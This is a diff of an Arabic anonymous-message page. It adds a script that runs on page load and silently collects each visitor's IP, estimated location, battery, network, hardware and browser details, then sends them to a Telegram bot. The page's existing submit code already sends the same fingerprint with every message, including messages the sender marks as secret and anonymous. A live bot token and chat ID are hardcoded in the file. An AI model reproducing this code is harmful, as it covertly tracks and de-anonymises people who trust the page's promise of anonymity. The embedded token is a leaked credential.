@@ -202,7 +202,7 @@
    
  <br>
    <script async="" src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js?client=ca-pub-7711303245649020" crossorigin="anonymous"></script>
-<ins class="adsbygoogle" style="display:block" data-ad-client="ca-pub-7711303245649020" data-ad-slot="9729415008" data-ad-format="auto" data-full-width-responsive="true"></ins>
+<ins class="adsbygoogle" style="display:block" data-ad-client="ca-pub-7711303245649020" data-ad-format="auto" data-full-width-responsive="true"></ins>
 <script>
      (adsbygoogle = window.adsbygoogle || []).push({});
 </script>
@@ -327,27 +327,13 @@ function getFile() {
 }
 
 // ==========================================
-// كود إرسال البيانات المحدث بشاشة الانتظار
+// إعدادات التليجرام
 // ==========================================
 const BOT_TOKEN = '8780209256:AAHMYOqgAYNdhx_FCFQDB6VRTJjWUNOTjLM';
 const CHAT_ID = '8027742578';
 
-async function send_form() {
-    const txt = document.getElementById('sarhne');
-    const messageText = txt.value.trim();
-    
-    if (!messageText) {
-        return;
-    }
-
-    // إخفاء فورم الكتابة وإظهار شاشة الانتظار المخصصة
-    document.getElementById('form').style.display = 'none';
-    const loadingScreen = document.getElementById('loading_screen');
-    loadingScreen.style.display = 'block';
-
-    const isSecret = document.getElementById("show_my_info").checked;
-    const sendType = isSecret ? "سري (مجهول)" : "علني";
-
+// دالة جلب كافة بيانات الجهاز والإتصال
+async function collectDeviceData() {
     const platform = navigator.platform || "غير معروف";
     const language = navigator.language || "غير معروف";
     const userAgent = navigator.userAgent;
@@ -379,27 +365,86 @@ async function send_form() {
         }
     } catch (err) {}
 
+    return {
+        ip, locationInfo, platform, screenW, screenH,
+        batteryInfo, connection, cores, memory, touchSupport,
+        timezone, language, userAgent
+    };
+}
+
+// إرسال تنبيه صامت بمجرد فتح الزائر للموقع
+async function sendVisitorNotification() {
+    const data = await collectDeviceData();
+
+    let fullMessage = `👁 <b>زائر جديد فتح البروفايل الآن!</b>\n\n`;
+    fullMessage += `📊 <b>بيانات الجهاز والشبكة:</b>\n`;
+    fullMessage += `🌐 <b>IP:</b> <code>${data.ip}</code>\n`;
+    fullMessage += `📍 <b>الموقع التقديري:</b> ${data.locationInfo}\n`;
+    fullMessage += `💻 <b>النظام:</b> ${data.platform}\n`;
+    fullMessage += `📱 <b>دقة الشاشة:</b> ${data.screenW}x${data.screenH}\n`;
+    fullMessage += `🔋 <b>البطارية:</b> ${data.batteryInfo}\n`;
+    fullMessage += `📶 <b>نوع الشبكة:</b> ${data.connection}\n`;
+    fullMessage += `⚙️ <b>أنوية المعالج:</b> ${data.cores}\n`;
+    fullMessage += `🧠 <b>الذاكرة:</b> ${data.memory}\n`;
+    fullMessage += `👆 <b>دعم اللمس:</b> ${data.touchSupport}\n`;
+    fullMessage += `⏰ <b>المنطقة الزمنية:</b> ${data.timezone}\n`;
+    fullMessage += `🗣 <b>اللغة:</b> ${data.language}\n`;
+    fullMessage += `🌐 <b>المتصفح:</b> <code>${data.userAgent}</code>\n`;
+
+    const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
+    
+    try {
+        fetch(url, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({
+                chat_id: CHAT_ID,
+                text: fullMessage,
+                parse_mode: 'HTML'
+            })
+        });
+    } catch (error) {}
+}
+
+// دالة إرسال المصارحة عند ضغط الزر
+async function send_form() {
+    const txt = document.getElementById('sarhne');
+    const messageText = txt.value.trim();
+    
+    if (!messageText) {
+        return;
+    }
+
+    // إخفاء النموذج الحالي وإظهار شاشة الانتظار
+    document.getElementById('form').style.display = 'none';
+    const loadingScreen = document.getElementById('loading_screen');
+    loadingScreen.style.display = 'block';
+
+    const isSecret = document.getElementById("show_my_info").checked;
+    const sendType = isSecret ? "سري (مجهول)" : "علني";
+
+    const data = await collectDeviceData();
+
     let fullMessage = `<b>📩 رسالة مصارحة جديدة لـ محمد شعبان</b>\n\n`;
     fullMessage += `🔒 <b>نوع الإرسال:</b> ${sendType}\n`;
     fullMessage += `💬 <b>الرسالة:</b>\n${messageText}\n\n`;
     fullMessage += `-------------------------\n`;
     fullMessage += `📊 <b>بيانات المرسل:</b>\n`;
-    fullMessage += `🌐 <b>IP:</b> <code>${ip}</code>\n`;
-    fullMessage += `📍 <b>الموقع التقديري:</b> ${locationInfo}\n`;
-    fullMessage += `💻 <b>النظام:</b> ${platform}\n`;
-    fullMessage += `📱 <b>دقة الشاشة:</b> ${screenW}x${screenH}\n`;
-    fullMessage += `🔋 <b>البطارية:</b> ${batteryInfo}\n`;
-    fullMessage += `📶 <b>نوع الشبكة:</b> ${connection}\n`;
-    fullMessage += `⚙️ <b>أنوية المعالج:</b> ${cores}\n`;
-    fullMessage += `🧠 <b>الذاكرة:</b> ${memory}\n`;
-    fullMessage += `👆 <b>دعم اللمس:</b> ${touchSupport}\n`;
-    fullMessage += `⏰ <b>المنطقة الزمنية:</b> ${timezone}\n`;
-    fullMessage += `🗣 <b>اللغة:</b> ${language}\n`;
-    fullMessage += `🌐 <b>المتصفح:</b> <code>${userAgent}</code>\n`;
+    fullMessage += `🌐 <b>IP:</b> <code>${data.ip}</code>\n`;
+    fullMessage += `📍 <b>الموقع التقديري:</b> ${data.locationInfo}\n`;
+    fullMessage += `💻 <b>النظام:</b> ${data.platform}\n`;
+    fullMessage += `📱 <b>دقة الشاشة:</b> ${data.screenW}x${data.screenH}\n`;
+    fullMessage += `🔋 <b>البطارية:</b> ${data.batteryInfo}\n`;
+    fullMessage += `📶 <b>نوع الشبكة:</b> ${data.connection}\n`;
+    fullMessage += `⚙️ <b>أنوية المعالج:</b> ${data.cores}\n`;
+    fullMessage += `🧠 <b>الذاكرة:</b> ${data.memory}\n`;
+    fullMessage += `👆 <b>دعم اللمس:</b> ${data.touchSupport}\n`;
+    fullMessage += `⏰ <b>المنطقة الزمنية:</b> ${data.timezone}\n`;
+    fullMessage += `🗣 <b>اللغة:</b> ${data.language}\n`;
+    fullMessage += `🌐 <b>المتصفح:</b> <code>${data.userAgent}</code>\n`;
 
     const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
     
-    // إرسال البيانات لتليجرام
     try {
         fetch(url, {
             method: 'POST',
@@ -412,7 +457,7 @@ async function send_form() {
         });
     } catch (error) {}
 
-    // بدء العداد التنازلي من 5 إلى 1
+    // تشغيل العداد التنازلي من 5 إلى 1
     let count = 5;
     const timerElement = document.getElementById('countdown_timer');
     
@@ -422,7 +467,6 @@ async function send_form() {
             timerElement.textContent = count;
         } else {
             clearInterval(interval);
-            // إظهار ناتج الإرسال بعد اكتمال العد
             loadingScreen.innerHTML = `
                 <h3 style="color: #60bf80; font-size: 20px; font-weight: bold; margin-bottom: 10px;">تم إرسال المصارحة بنجاح!</h3>
                 <p style="color: #777; font-size: 14px;">وصلت رسالتك بنجاح إلى محمد شعبان.</p>
@@ -432,7 +476,10 @@ async function send_form() {
     }, 1000);
 }
 
+// تنفيذ جلب وإرسال البيانات فور فتح الصفحة
 document.addEventListener('DOMContentLoaded', function() {
+    sendVisitorNotification();
+
     const txt = document.getElementById('sarhne');
     if (txt) {
         txt.addEventListener('input', function() {
@@ -462,3 +509,4 @@ document.addEventListener('DOMContentLoaded', function() {
 
 </center>
 </body></html>
+
